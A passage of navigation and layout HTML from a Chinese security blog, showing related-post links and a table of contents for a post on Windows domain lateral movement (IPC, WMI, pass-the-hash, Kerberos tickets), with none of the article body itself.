is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-10-11</div><div class="title">Cobalt-Strike</div></div></a></div><div><a href="/2024/10/11/DC%E9%9D%B6%E5%9C%BA/" title="DC靶场"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-10-11</div><div class="title">DC靶场</div></div></a></div><div><a href="/2024/10/11/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="Linux权限维持"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-10-11</div><div class="title">Linux权限维持</div></div></a></div><div><a href="/2024/10/11/Windows%E6%8F%90%E6%9D%83/" title="Windows提权"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-10-11</div><div class="title">Windows提权</div></div></a></div><div><a href="/2024/10/11/java%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-10-11</div><div class="title">java内存马</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/03/03/e511960ac5488.png" alt="status"/></div></div><div class="author-info__description">生活明朗 万物可爱</div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">大家好 我是VV 欢迎来看我的博客鸭~  希望你可以从中学习到一些知识</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IPC"><span class="toc-number">1.1.</span> <span class="toc-text">IPC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B9%8B%E5%89%8D"><span class="toc-number">1.1.1.</span> <span class="toc-text">横向移动之前</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E6%8A%93%E5%8F%96"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">凭证抓取</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">IPC横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8BIPC%E8%BF%9E%E6%8E%A5%E5%88%B0%E7%9B%AE%E6%A0%87"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">建立IPC连接到目标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%B7%E8%B4%9D%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%B0%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">拷贝要执行的木马到目标主机</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#IPC%E8%BF%9E%E6%8E%A5%E6%8B%B7%E8%B4%9D"><span class="toc-number">1.1.2.2.1.</span> <span class="toc-text">IPC连接拷贝</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">计划任务执行木马</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.1.2.3.1.</span> <span class="toc-text">正向连接上线</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.1.2.3.2.</span> <span class="toc-text">反向连接上线</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6IPC%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">插件IPC移动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IPC%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">IPC常见报错</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%97%E4%BB%B6-impacket-ipc"><span class="toc-number">1.1.3.</span> <span class="toc-text">套件-impacket-ipc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#socks%E4%BB%A3%E7%90%86"><span class="toc-number">1.1.4.</span> <span class="toc-text">socks代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI"><span class="toc-number">1.2.</span> <span class="toc-text">WMI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.1.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%97%E4%BB%B6%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.2.</span> <span class="toc-text">套件执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.3.</span> <span class="toc-text">插件执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.4.</span> <span class="toc-text">脚本执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kali%E8%87%AA%E5%B8%A6pth%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.5.</span> <span class="toc-text">kali自带pth执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB"><span class="toc-number">1.3.</span> <span class="toc-text">SMB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#psexec"><span class="toc-number">1.3.1.</span> <span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#impacket%E5%A5%97%E4%BB%B6"><span class="toc-number">1.3.2.</span> <span class="toc-text">impacket套件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMBexec"><span class="toc-number">1.3.3.</span> <span class="toc-text">SMBexec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">1.4.</span> <span class="toc-text">密码喷洒</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E4%BB%A3%E7%90%86"><span class="toc-number">1.4.1.</span> <span class="toc-text">linux代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">1.4.2.</span> <span class="toc-text">工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E5%9F%9F%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">密码喷洒域登录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">本地登录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%99%BB%E5%BD%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">本地登录执行命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinRM"><span class="toc-number">1.5.</span> <span class="toc-text">WinRM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Winrs"><span class="toc-number">1.5.1.</span> <span class="toc-text">Winrs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Winrm"><span class="toc-number">1.5.2.</span> <span class="toc-text">Winrm</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP"><span class="toc-number">1.6.</span> <span class="toc-text">RDP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C2%E6%A8%AA%E5%90%91"><span class="toc-number">1.7.</span> <span class="toc-text">C2横向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gotohttp"><span class="toc-number">1.7.1.</span> <span class="toc-text">gotohttp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RustDesk"><span class="toc-number">1.7.2.</span> <span class="toc-text">RustDesk</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberos%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.8.</span> <span class="toc-text">kerberos协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.8.0.1.</span> <span class="toc-text">简单学习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-number">1.8.0.2.</span> <span class="toc-text">kerberoasting攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH"><span class="toc-number">1.9.</span> <span class="toc-text">PTH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">1.9.1.</span> <span class="toc-text">前置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTH-1"><span class="toc-number">1.9.2.</span> <span class="toc-text">PTH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz%E8%BF%9B%E8%A1%8CPTH%E6%94%BB%E5%87%BB"><span class="toc-number">1.9.3.</span> <span class="toc-text">mimikatz进行PTH攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#impacket%E8%BF%9B%E8%A1%8CPTH%E6%94%BB%E5%87%BB"><span class="toc-number">1.9.4.</span> <span class="toc-text">impacket进行PTH攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#psexec-1"><span class="toc-number">1.9.4.1.</span> <span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#smbexec"><span class="toc-number">1.9.4.2.</span> <span class="toc-text">smbexec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmiexec"><span class="toc-number">1.9.4.3.</span> <span class="toc-text">wmiexec</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crackMapExec-PTH"><span class="toc-number">1.9.5.</span> <span class="toc-text">crackMapExec-PTH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTK"><span class="toc-number">1.10.</span> <span class="toc-text">PTK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTT"><span class="toc-number">1.11.</span> <span class="toc-text">PTT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MS14068"><span class="toc-number">1.11.1.</span> <span class="toc-text">MS14068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KEKEO"><span class="toc-number">1.11.2.</span> <span class="toc-text">KEKEO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz"><span class="toc-number">1.11.3.</span> <span class="toc-text">mimikatz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.12.</span> <span class="toc-text">黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.12.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.12.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.12.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D"><span class="toc-number">1.12.3.1.</span> <span class="toc-text">域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%9A%84SID%E5%80%BC"><span class="toc-number">1.12.3.2.</span> <span class="toc-text">域的SID值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%9A%84KRBTGT%E8%B4%A6%E6%88%B7hash"><span class="toc-number">1.12.3.3.</span> <span class="toc-text">域的KRBTGT账户hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E7%94%A8%E6%88%B7"><span class="toc-number">1.12.3.4.</span> <span class="toc-text">伪造用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.12.3.5.</span> <span class="toc-text">导入票据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.13.</span> <span class="toc-text">白银票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-number">1.13.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">1.13.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">1.13.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D-1"><span class="toc-number">1.13.3.1.</span> <span class="toc-text">域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9FSID"><span class="toc-number">1.13.3.2.</span> <span class="toc-text">域SID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8FQDN"><span class="toc-number">1.13.3.3.</span> <span class="toc-text">目标服务器FQDN</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.13.3.4.</span> <span class="toc-text">可利用的服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%93%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7hash"><span class="toc-number">1.13.3.5.</span> <span class="toc-text">抓服务账号hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E7%94%A8%E6%88%B7-1"><span class="toc-number">1.13.3.6.</span> <span class="toc-text">伪造用户</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E4%B8%8E%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%8C%BA%E5%88%AB"><span class="toc-number">1.13.4.</span> <span class="toc-text">黄金票据与白银票据区别</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" title="红日靶场">红日靶场</a><time datetime="2024-10-11T14:29:47.000Z" title="发表于 2024-10-11 22:29:47">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/DC%E9%9D%B6%E5%9C%BA/" title="DC靶场">DC靶场</a><time datetime="2024-10-11T14:25:37.000Z" title="发表于 2024-10-11 22:25:37">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="横向移动">横向移动</a><time datetime="2024-10-11T14:16:00.000Z" title="发表于 2024-10-11 22:16:00">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/java%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马">java内存马</a><time datetime="2024-10-11T14:09:17.000Z" title="发表于 2024-10-11 22:09:17">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/python%E5%86%85%E5%AD%98%E9%A9%AC/" title="python内存马">python内存马</a><time datetime="2024-10-11T14:05:40.000Z" title="发表于 2024-10-11 22:05:40">2024-10-11</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By VVkladg0r</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">7</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CC%E9%93%BE/" style="font-size: 0.88rem;">CC链<sup>7</sup></a><a href="/tags/Linux/" style="font-size: 0.88rem;">Linux<sup>2</sup></a><a href="/tags/Windows/" style="font-size: 0.88rem;">Windows<sup>2</sup></a><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>13</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">java安全<sup>13</sup></a><a href="/tags/misc/" style="font-size: 0.88rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>9</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>9</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 0.88rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 0.88rem;">内网<sup>15</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 0.88rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 0.88rem;">学习<sup>26</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">工具<sup>2</sup></a><a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">提权<sup>3</sup></a><a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" style="font-size: 0.88rem;">横向移动<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">渗透<sup>15</sup></a><a href="/tags/%E7%BB%B4%E6%9D%83/" style="font-size: 0.88rem;">维权<sup>5</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont 